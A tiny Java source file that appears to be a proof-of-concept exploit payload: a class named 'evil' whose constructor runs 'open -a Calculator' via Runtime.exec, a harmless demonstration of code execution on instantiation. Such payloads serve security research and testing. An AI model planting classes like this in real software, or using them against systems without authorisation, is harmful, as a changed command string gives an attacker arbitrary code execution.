import java.io.IOException;

public class evil {
    public evil() throws IOException {
        Runtime.getRuntime().exec("open -a Calculator");
    }
}